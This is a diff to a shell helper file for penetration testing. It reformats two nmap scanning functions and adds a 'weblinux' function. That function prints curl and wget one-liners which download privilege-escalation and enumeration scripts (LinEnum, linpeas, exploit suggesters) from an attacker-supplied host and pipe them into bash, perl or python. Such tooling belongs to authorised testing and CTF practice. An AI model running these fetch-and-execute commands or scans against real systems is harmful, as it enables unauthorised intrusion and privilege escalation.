@@ -1,15 +1,33 @@
 function nse(){
-        SCRIPT_SEARCH=$1 
-        IP=$2
-        PORT=$3
-        for script in $(ls  /usr/share/nmap/scripts | grep -i $SCRIPT_SEARCH)
-        do
-        echo "sudo nmap -p $PORT --script=$script -oN nmap_nse_$script $IP"
-        done
-
+	SCRIPT_SEARCH=$1 
+	IP=$2
+	PORT=$3
+	for script in $(ls  /usr/share/nmap/scripts | grep -i $SCRIPT_SEARCH)
+	do
+	echo "sudo nmap -p $PORT --script=$script -oN nmap_nse_$script $IP"
+	done
 }
 
 function scan4me(){
-        sudo nmap -Pn -sS -T 4 -sV -sC -A -oN nmap_tcp_scan $1 
-        sudo nmap -Pn -sU -T 4 -oN nmap_udp_scan $1 
+	sudo nmap -Pn -sS -T 4 -sV -sC -A -oN nmap_tcp_scan $1 
+	sudo nmap -Pn -sU -T 4 -oN nmap_udp_scan $1 
 }
+
+function weblinux(){
+  LHOST=$1
+  SOFT=$2 
+ if [ $SOFT == "curl" ];then 
+  echo "curl -s http://$LHOST/LinEnum.sh | bash"
+  echo "curl -s http://$LHOST/linpeas.sh | bash"
+  echo "curl -s http://$LHOST/linux-exploit-suggester-2.pl | perl" 
+  echo "curl -s http://$LHOST/linux-exploit-suggester.sh | bash"
+  echo "curl  -s http://$LHOST/linuxprivchecker.py | python"
+ elif [ $SOFT == 'wget' ]; then
+  echo "wget -q http://$LHOST/LinEnum.sh -O - | bash"
+  echo "wget -q http://$LHOST/linpeas.sh -O - | bash"
+  echo "wget -q http://$LHOST/linux-exploit-suggester-2.pl -O - | perl" 
+  echo "wget -q http://$LHOST/linux-exploit-suggester.sh -O - | bash"
+  echo "wget -q  http://$LHOST/linuxprivchecker.py -O - | python"
+fi
+}
+
